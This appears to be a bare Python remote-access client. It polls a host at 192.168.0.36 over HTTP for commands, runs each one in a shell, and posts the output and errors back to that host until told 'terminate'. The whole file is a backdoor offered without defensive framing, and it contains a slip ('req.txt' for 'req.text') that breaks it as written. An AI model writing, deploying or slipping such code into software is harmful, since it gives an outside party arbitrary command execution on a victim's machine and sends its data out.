import requests
import subprocess
import time


while True:
	req = requests.get('http://192.168.0.36')
	command=req.txt

	if 'terminate' in command:
		break

	else:
		CMD=subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
		post_response = requests.post(url='http://192.168.0.36',data=CMD.stdout.read() )
		post_response = requests.post(url='http://192.168.0.36',data=CMD.stderr.read() )

	time.sleep(3)